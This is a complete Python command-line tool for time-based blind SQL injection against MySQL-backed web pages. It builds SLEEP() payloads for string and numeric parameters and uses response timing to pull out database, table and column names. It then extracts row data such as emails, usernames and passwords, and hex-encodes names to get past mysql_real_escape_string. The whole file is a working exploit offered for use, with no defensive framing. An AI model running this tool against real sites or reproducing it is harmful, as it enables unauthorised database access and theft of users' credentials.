#!/usr/bin/env python

import requests, timeit, string, sys, getopt

headers = {
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Content-Type': 'application/x-www-form-urlencoded'
}

params = {}

alphabeth = list(string.ascii_lowercase) + list(string.digits) + list('_.+-@:')

def main(pName, argv):
	url = ''
	data = {}
	database = ''
	table = 'users'
	method = 'get'
	sleeptime = 1
	query = ''
	opts = []
	args = []
	column_list = []
	isDBSearch = False
	isTableInspection = False
	isTableSearch = False
	isDataExtraction = False
	isMuted = False
	isVerbose = False

	try:
		opts, args = getopt.getopt(argv,'hu:s:d:b:t:c:mv',['help','url=', 'sleeptime=', 'data=',"databases", "database=", "tables", "table=", "columns", "column-list=", "mute", 'verbose'])
	except getopt.GetoptError:
		help(pName,2)

	for opt, arg in opts:
		if opt == '-h' or opt == '-help':
			help(pName)
		elif opt == '-u' or opt == '--url':
			url = arg
		elif (opt == '-s' or opt == '--sleeptime') and valid(arg):
			sleeptime = float(arg)
		elif opt == '-d' or opt == '--data':
			query = arg
			method = 'post'
		elif opt == '--databases':
			isDBSearch = True
		elif opt == '-b' or opt == '--database':
			database = arg
		elif opt == '--tables':
			isTableSearch = True
		elif opt == '-t' or opt == '--table':
			table = arg
		elif opt == '--columns':
			isTableInspection = True
		elif opt == '-c' or opt == '--column-list':
			column_list = arg.split(',')
			isDataExtraction = True
		elif opt == '-m' or opt == '--mute':
			isMuted = True
		elif opt == '-v' or opt == '--verbose':
			isVerbose = True
		else:
			help(pName,3)

	if isVerbose and isMuted:
		print('Something went wrong: you set both --mute and --verbose option!')
		sys.exit(8)

	if check(url):
		if not query:
			split = url.split('?')
			if len(split) == 2:
				url = split[0]
				data = split_request_params(split[1])
			else:
				print_no_data()
				sys.exit(4)
		else:
			data = split_request_params(query)

	if isDBSearch:
		retrieve_databases(url, data, method, sleeptime, isMuted, isVerbose)
	elif isTableSearch:
		retrieve_tables(url, data, method, sleeptime, database, isMuted, isVerbose)
	elif isTableInspection:
		table_inspection(url, data, method, sleeptime, database, table, isMuted, isVerbose)
	elif isDataExtraction:
		retrieve_data(url, data, method, sleeptime, database, table, column_list, isMuted, isVerbose)
	else:
		help(pName,7)

def print_no_data():
	print('No parameter was passed to make the request please provide the parameters of the query via the parameter date and indicate the http function used if necessary by default we will assume to make a request get')

def valid(a):
	try:
	    b = int(a)
	except ValueError:
	    try:
	        b = float(a)
	    except ValueError:
	        return False
	    else:
	        return True
	else:

		return True
def split_request_params(params = ''):
	data = {}

	split = params.split('&')
	for s in split:
		ss = s.split('=')
		data[ss[0]] = ss[1]

	return data

def help(pName, errorCode=0):
	print(pName + ' -u <url> [options]')
	print('\tOPTIONS')
	print('\t-h | --help\t\t\t\tPrint this message')
	print('')
	print('\t-u <url> | --url=<url>\t\t\tSets the url of the vulnerable page.')
	print('\t\t\t\t\t\tTerminating with get parameters if needed. See --data option for structure rules')
	print('')
	print('\t-s <time:float> | --sleeptime=<time:float>\t\t\tSets wait time for SLEEP() instruction')
	print('')
	print('\t-d | --data\t\t\t\tStrings that represents the POST request data in url encoded format')
	print('\t\t\t\t\t\tin wich the parameters are in the form variablename=variabletype')
	print('\t\t\t\t\t\twhere variablename is the name uf the request paramenter ')
	print('\t\t\t\t\t\tand variabletype is the tipe of the request parameter ')
	print('\t\t\t\t\t\tthe type could be either \'string\' or \'number\'')
	print('\t\t\t\t\t\tE.g. email=string&id=number.')
	print('\t\t\t\t\t\tI --data paremeter is set, the request will be performed in POST method')
	print('')
	print('\t--databases\t\t\t\tExtract databases list')
	print('')
	print('\t-b <dbname> | --database=<dbname>\tSets the database name for the next instruction (--tables or --table)')
	print('')
	print('\t--tables\t\t\t\tExtract the table list from the provided database')
	print('')
	print('\t-t <tablename> | --table=<tablename>\tSets the table name for the next instruction (--columns or --column-list)')
	print('')
	print('\t--columns\t\t\t\tExtract column names list from the provided table')
	print('')
	print('\t-c <list> | --column-list=<list>\tSets a list of comma separated column names whose values ​​are to be extracted ')
	print('\t\t\t\t\t\tE.g.: email,username,password')
	print('')
	print('\t-m | --mute\t\t\t\tThe program doesn\'t print the data extracted at the end of executon')
	print('')
	print('\t-v | --verbose\t\t\t\tVerbose mode: the program prints also the payloads used for injection')
	sys.exit(errorCode)


def check(url):
	return len(url) > 0

# Perform the request
def exec_request(url, headers, params = {}, method = 'get'):

	start = timeit.default_timer()
	if method == 'get':
		response = requests.get(url, headers=headers, params=params)
	elif method == 'post':
		response = requests.post(url, headers=headers, data=params)
	stop = timeit.default_timer()

	return stop - start

# This function prepares the vulnerable parameter by assigning it as a value
# a string that wraps the payload according to whether the value is
# numeric or a string
def prepare_exploitable(params, key, type, payload, isVerbose = False):

	if type == 'string' or type == 'number':
		if type == 'string':
			params[key] = "' AND (" + payload + ") AND 1=1 -- -"
		elif type == 'number':
			params[key] = "1+IF((" + payload + ") IS NULL, 0, 1)"
	else:
		print('Type of parameters passed incorrect. The type can be \'string\' or \'number\'')
		sys.exit(4)

	if isVerbose:
		print(params[key])

	return params

# Prepare all the other parameters indicated with dummy values
def prepare_others(params, data, key):
	for local_key in params:
		if local_key != key:
			if data[local_key] == 'string' or data[local_key] == 'number':
				if data[local_key] == 'string':
					params[local_key] = ''
				elif data[local_key] == 'number':
					params[local_key] = 1
			else:
				print('Type of parameters passed incorrect. The type can be \'string\' or \'number\'')
				sys.exit(5)

	return params

# Performs injection for the count of the elements (databases, tables, rows)
def count(url, headers, params, key, type='string', method = 'get', sleeptime = 1, payload = '', isVerbose = False):

	# Conteggio numero elementi del
	for count in range(1,sys.maxsize):

		params = prepare_exploitable(params, key, type, payload.format(count, sleeptime), isVerbose)

		if exec_request(url, headers, params, method) >= sleeptime:
			return count

# Performs the extraction of data related to the required elements
def exploit(url, headers, params, key, type='string', method = 'get', sleeptime = 1, payload='', n_elements = 1, isMuted = False, isVerbose = False):
	elements = []

	for i in range(0, n_elements):
		element = []
		count = 0
		found = True
		while found:
			local_found = False
			for a in alphabeth:
				params = prepare_exploitable(params, key, type, payload.format(i, count+1, hex(ord(a)), sleeptime), isVerbose)
				if exec_request(url, headers, params, method) >= sleeptime:
					local_found = True
					count+=1
					element.append(a)
					break

			found = local_found

		if element != []:
			elements.append(element)

	# Print the data found
	if not isMuted and elements != []:
		for e in elements:
			print(''.join(e))
		sys.exit(0)
	elif elements == []:
		print('No data found')
	else:
		sys.exit(0)

# Core function: execute the request with elements counting and data extraction
def execute(url, data, method='get', sleeptime = 1, payload_count='', payload_extraction='', isMuted = False, isVerbose = False):
	elements = []

	params = dict(data)

	# Run the injection for each parameter of the request until I find results
	for key in data:

		params = prepare_others(params, data, key)

		n_elements = count(url, headers, params, key, data[key], method, sleeptime, payload_count, isVerbose)
		if n_elements == 0:
			print("No database found, the site is not based on MySQL datadase or the page is not vulnerable to timing based SQL injection")
		else:
			exploit(url, headers, params, key, data[key], method, sleeptime, payload_extraction, n_elements, isMuted, isVerbose)

# Turns a string into its corresponding list of encoded characters
# hexadecimal to be passed to CONCAT()
def calulate_hex_list(string):
	list_hex = []
	for l in string:
		list_hex.append(hex(ord(l)))
	return ",".join(list_hex)

def check_data(data = {}):
	if data == {}:
		print_no_data()
		sys.exit(4)

# Function that retrieves database names
def retrieve_databases(url, data={}, method='get', sleeptime = 1, isMuted = False, isVerbose = False):

	# Check the existence of all the parameters necessary to perform the injection
	check_data(data)

	payload_count = "SELECT * FROM (SELECT COUNT(*) AS n_databases FROM information_schema.schemata)x WHERE x.n_databases = {} AND SLEEP({})"

	payload_extraction = "SELECT * FROM(SELECT schema_name FROM information_schema.schemata LIMIT {},1)x WHERE MID(x.schema_name,{},1) = {} AND SLEEP({})"

	execute(url, data, method, sleeptime, payload_count, payload_extraction, isMuted, isVerbose)

def check_datadb(data = {}, db = ''):
	check_data(data)
	if db == '':
		print('The name of the database to search was not passed');
		sys.exit(5)

# Recovers table names for a given database
def retrieve_tables(url, data={}, method='get', sleeptime = 1, db='', isMuted = False, isVerbose = False):

	# Check the existence of all the parameters necessary to perform the injection
	check_datadb(data, db)

	# Transforms the database name string into a list of values
	# comma-separated hexadecimal to pass it to the payload query
	# so that it is safe even to bypass mysql_real_escape_string
	database_hex = calulate_hex_list(db)

	payload_count = "SELECT * FROM (SELECT COUNT(*) AS n_tables FROM information_schema.tables WHERE table_schema = CONCAT(" + database_hex + "))x WHERE x.n_tables = {} AND SLEEP({})"
	payload_extraction = "SELECT * FROM(SELECT table_name FROM information_schema.tables WHERE table_schema = CONCAT(" + database_hex + ") LIMIT {},1)x WHERE MID(x.table_name,{},1) = {} AND SLEEP({})"

	execute(url, data, method, sleeptime, payload_count, payload_extraction, isMuted, isVerbose)

def check_datadbtable(data = {}, db = '', table = ''):
	check_datadb(data,db)
	if table == '':
		print('The name of the table to be inspected has not been passed');
		sys.exit(6)

# recupera il nome delle colonne di una tabella data
def table_inspection(url, data={}, method='get', sleeptime = 1, db='', table='', isMuted = False, isVerbose = False):
	n_columns = 0

	# Check the existence of all the parameters necessary to perform the injection
	check_datadbtable(data, db, table)

	# Transforms the database name string into a list of values
	# comma-separated hexadecimal to pass it to the payload query
	# so that it is safe even to bypass mysql_real_escape_string
	database_hex = calulate_hex_list(db)

	# The same is done with the table name
	table_hex = calulate_hex_list(table)

	payload_count = "SELECT * FROM (SELECT COUNT(*) AS n_columns FROM information_schema.columns WHERE table_schema = CONCAT(" + database_hex + ") AND table_name = CONCAT(" + table_hex + "))x WHERE x.n_columns = {} AND SLEEP({})"
	payload_extraction = "SELECT * FROM(SELECT CONCAT(column_name,"+hex(ord(':'))+",column_type) AS column_info FROM information_schema.columns WHERE table_schema = CONCAT(" + database_hex + ") AND table_name = CONCAT(" + table_hex + ") LIMIT {},1)x WHERE MID(x.column_info,{},1) = {} AND SLEEP({})"

	execute(url, data, method, sleeptime, payload_count, payload_extraction, isMuted, isVerbose)

def check_datadbtablecolumns(data = {}, db = '', table = '', columns_list = []):
	check_datadbtable(data,db,table)
	if columns_list == []:
		print('The list of columns to be extracted has not been passed');
		sys.exit(7)

# Recovers data contained in columns in columns_list for a given table
def retrieve_data(url, data={}, method='get', sleeptime = 1, db='', table='', columns_list = [], isMuted = False, isVerbose = False):

	# Check the existence of all the parameters necessary to perform the injection
	check_datadbtablecolumns(data,db,table,columns_list)

	columns_concat = (','+hex(ord(':'))+',').join(columns_list)

	payload_count = "SELECT * FROM (SELECT COUNT(*) AS n_rows FROM  " + db + '.' + table + ")x WHERE n_rows = {} AND SLEEP({})"

	payload_extraction = "SELECT * FROM(SELECT CONCAT(" + columns_concat + ") AS data FROM " + db + '.' + table + " LIMIT {},1)x WHERE MID(x.data,{},1) = {} AND SLEEP({})"

	execute(url, data, method, sleeptime, payload_count, payload_extraction, isMuted, isVerbose)

if __name__ == '__main__':
	main(sys.argv[0], sys.argv[1:])
	sys.exit(0)
